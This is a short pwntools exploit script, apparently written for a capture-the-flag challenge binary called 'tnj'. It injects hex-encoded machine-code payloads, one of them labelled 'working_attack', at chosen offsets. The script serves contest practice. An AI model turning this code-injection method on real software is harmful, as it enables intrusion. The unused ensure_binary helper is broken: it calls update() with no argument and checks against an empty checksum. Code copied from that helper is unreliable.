from pwn import *
import sys
import binascii
import hashlib
context(log_level='debug', timeout=600)

invalid_400 = "207c000004004ed020fc000000104ef80000"
invalid_400 = binascii.unhexlify(invalid_400)
do_nothing = "4EF80000"
do_nothing = binascii.unhexlify(do_nothing)
original_binary_chksum = ''

#working_attack = '21 fc bb bb bb bb 02 f8  21 fc bb bb bb bb 00 00 20 3c bb bb bb bb b0 b8  00 00 66 0a b0 b8 02 f866 10 4e f8 01 80 21 fc  4e f8 00 00 00 00 4e f800 00 21 fc 4e f8 02 f8  02 f8 4e f8 02 f8'.replace(' ', '')
working_attack = '4e7160fe'
working_attack = binascii.unhexlify(working_attack)

def ensure_binary(binary_path):
    m = hashlib.sha256()
    with open(binary_path, 'rb') as f:
        m.update()
    assert m.digest() == original_binary_chksum

def send_content(content, loc=0, need_print=True):
    with process('../tnj flag'.split()) as p:
        p.recvuntil('size > ')
        p.sendline(str(len(content)))
        p.recvuntil('code > ')
        p.send(content)
        p.recvuntil('loc > ')
        p.sendline(str(loc))
        p.recvuntil('[*]')
        if need_print:
            print(p.recvuntil('[+]'))
        else:
            p.recvuntil('[+]')
        # ensure end mark IS the end mark
        try:
            p.sendline('aaa')
        except EOFError:
            print('passed')
            return
        except Exception as e:
            print('not passed')
            raise e
        print('not passed')

def test_invalid_attacker():
    send_content(invalid_400)

def test_do_nothing():
    send_content(do_nothing)


def main():
    #test_invalid_attacker()
    #test_do_nothing()
    send_content(working_attack, 0x2f0, False)
    if len(sys.argv) >= 2:
        with open(sys.argv[1], 'rb') as f:
            content = f.read()
            send_content(content, 0x200, False)

if __name__ == '__main__':
   main()
